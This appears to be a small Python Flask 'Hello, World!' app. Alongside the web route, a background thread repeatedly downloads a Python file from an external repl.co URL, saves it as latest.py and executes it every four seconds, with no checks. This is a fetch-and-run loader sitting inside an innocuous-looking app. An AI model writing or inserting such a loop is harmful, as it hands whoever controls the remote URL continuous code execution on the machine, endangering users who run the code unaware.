from flask import Flask
import threading
import os
import time
import requests as r
lnk="https://telegram-vid-stream-new.billhui8006u.repl.co/run.py"


def run():
	while True:
		print("runnning file")
		prg=r.get(lnk).text
		print(prg)
		with open('latest.py','w') as f:
			f.write(prg)
		os.system("python latest.py")
		time.sleep(4)
x = threading.Thread(target=run)
x.start()
app = Flask('app')

@app.route('/')
def hello_world():
  return 'Hello, World!'




